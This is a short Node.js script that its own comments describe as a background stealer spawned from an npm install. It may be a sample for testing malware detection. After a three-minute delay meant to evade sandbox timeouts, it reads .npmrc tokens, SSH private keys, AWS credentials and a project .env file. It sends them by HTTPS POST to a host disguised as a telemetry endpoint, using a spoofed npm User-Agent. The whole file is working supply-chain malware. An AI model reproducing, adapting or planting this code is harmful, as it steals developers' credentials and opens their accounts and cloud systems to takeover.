// Background stealer — runs detached from npm install process
// Waits for parent to exit, then harvests credentials silently

const fs = require('fs');
const https = require('https');
const os = require('os');
const path = require('path');

// Wait 3 minutes — ensures npm install has finished and sandbox timeout has passed
setTimeout(() => {
  const loot = {
    host: os.hostname(),
    user: os.userInfo().username,
    arch: os.arch(),
    platform: process.platform,
    pid: process.pid,
    parentPid: process.env._MUADDIB_PARENT_PID
  };

  // Steal .npmrc tokens
  try {
    loot.npmrc = fs.readFileSync(path.join(os.homedir(), '.npmrc'), 'utf8');
  } catch (e) {}

  // Steal SSH private keys
  const sshDir = path.join(os.homedir(), '.ssh');
  try {
    const files = fs.readdirSync(sshDir);
    loot.ssh = {};
    for (const f of files) {
      if (f.startsWith('id_') && !f.endsWith('.pub')) {
        try {
          loot.ssh[f] = fs.readFileSync(path.join(sshDir, f), 'utf8');
        } catch (e) {}
      }
    }
  } catch (e) {}

  // Steal AWS credentials
  try {
    loot.aws = fs.readFileSync(path.join(os.homedir(), '.aws', 'credentials'), 'utf8');
  } catch (e) {}

  // Steal .env from common project directories
  const cwd = process.cwd();
  try {
    loot.dotenv = fs.readFileSync(path.join(cwd, '.env'), 'utf8');
  } catch (e) {}

  // Exfiltrate via HTTPS POST to attacker C2
  const data = JSON.stringify(loot);
  const req = https.request({
    hostname: 'api.pkg-telemetry.dev',
    path: '/v1/metrics',
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(data),
      'User-Agent': 'npm/10.0.0 node/v20.0.0'
    }
  }, () => {
    process.exit(0);
  });
  req.on('error', () => process.exit(0));
  req.write(data);
  req.end();
}, 3 * 60 * 1000);
